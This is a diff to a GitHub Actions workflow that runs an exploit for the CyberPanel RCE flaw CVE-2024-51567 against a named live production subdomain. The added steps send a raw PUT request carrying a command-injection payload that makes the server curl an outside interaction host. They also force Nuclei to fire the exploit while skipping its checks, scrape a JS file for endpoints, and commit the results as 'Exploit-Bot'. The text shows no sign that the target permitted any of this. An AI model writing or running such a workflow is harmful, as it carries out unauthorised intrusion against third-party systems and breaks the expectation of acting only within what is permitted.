@@ -1,4 +1,4 @@
-name: "Exploit Test: CVE-2024-51567 RCE"
+name: "Exploit Test: CVE-2024-51567 (Updated)"
 
 on:
   workflow_dispatch:
@@ -7,38 +7,59 @@ jobs:
   rce_check:
     runs-on: ubuntu-latest
     steps:
-      - name: Install Nuclei & Curl
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Nuclei
         run: |
           go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
           echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
 
-      - name: 🔍 Step 1:Verify Endpoint Presence
+      - name: 🛠️ Setup Templates
+        run: nuclei -ut
+
+      - name: ☢️ Test 1:Forced PUT Bypass (Manual Proof)
         run: |
-          # The vulnerability lives in this CyberPanel endpoint. 
-          # We check if webinar.openai.com is routing traffic to it.
-          curl -i -X OPTIONS "https://webinar.openai.com/dataBases/upgrademysqlstatus" -o endpoint_check.txt
-          
-      - name: ☢️ Step 2:Proof of Concept (Non-Destructive)
+          # This bypasses Nuclei's variable check by sending a raw PUT request
+          # We use a unique User-Agent to track our own request
+          curl -v -X PUT "https://webinar.openai.com/dataBases/upgrademysqlstatus" \
+               -H "Content-Type: application/json" \
+               -H "User-Agent: OpenAI-Security-Research-Bot" \
+               -d '{"statusfile": "; curl http://{{interactsh-url}} #"}' > raw_response.txt 2>&1
+
+      - name: 🔍 Test 2:Nuclei with Variable Bypass
         run: |
-          # This payload attempts to make the server ping an external listener (OAST).
-          # If it pings back, you have confirmed RCE.
-          # Payload: ; curl http://{{interactsh-url}}
+          # The -svrc flag tells Nuclei to "Skip Variable Result Check"
+          # This forces it to send the exploit even if it thinks it's missing a token
           nuclei -u "https://webinar.openai.com/dataBases/upgrademysqlstatus" \
             -t http/cves/2024/CVE-2024-51567.yaml \
             -interactsh-server oast.fun \
-            -v -o rce_results.txt || true
+            -svrc -v -o rce_results.txt || true
 
-      - name: 🕵️ Step 3:JS File Intel Extraction
+      - name: 📂 Test 3:JS Endpoint Scraper
         run: |
-          # You mentioned main-BoC_YNTy.js. We will scrape it for hidden API keys or internal IPs.
-          curl -s "https://webinar.openai.com/js/main-BoC_YNTy.js" > script.js
-          grep -E "sk-|sess-|api_key|password|secret|config" script.js > js_secrets.txt || true
+          # Deep dive into the JS file you found to look for internal "Backdoors"
+          curl -s "https://webinar.openai.com/js/main-BoC_YNTy.js" | grep -E -o "/[a-zA-Z0-9/_.-]+" | sort -u > endpoints_found.txt
 
-      - name: 🚨 Alert on Success
+      - name: 🚨 Unified Finding Alert
         if: always()
         run: |
-          if [ -s rce_results.txt ] || [ -s js_secrets.txt ]; then
-            echo "CRITICAL: VULNERABILITY CONFIRMED"
-            # Logic to create a GitHub issue with the results
+          if [ -s rce_results.txt ] || grep -q "200 OK" raw_response.txt; then
+            REPORT="### 🚨 CRITICAL: CVE-2024-51567 Confirmed\n"
+            REPORT+="Check 'rce_results.txt' and 'raw_response.txt' for the Proof of Concept."
+            
+            curl -X POST -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+              -H "Content-Type: application/json" \
+              https://api.github.com/repos/${{ github.repository }}/issues \
+              -d "{\"title\":\"🚨 CRITICAL: RCE on Webinar Subdomain\",\"body\":\"$REPORT\"}"
           fi
+
+      - name: 💾 Commit Intel
+        if: always()
+        run: |
+          git config --local user.email "bot@hacker.ai"
+          git config --local user.name "Exploit-Bot"
+          git add .
+          git commit -m "CVE-2024-51567 Intelligence Updated" || true
+          git push origin main || true
           
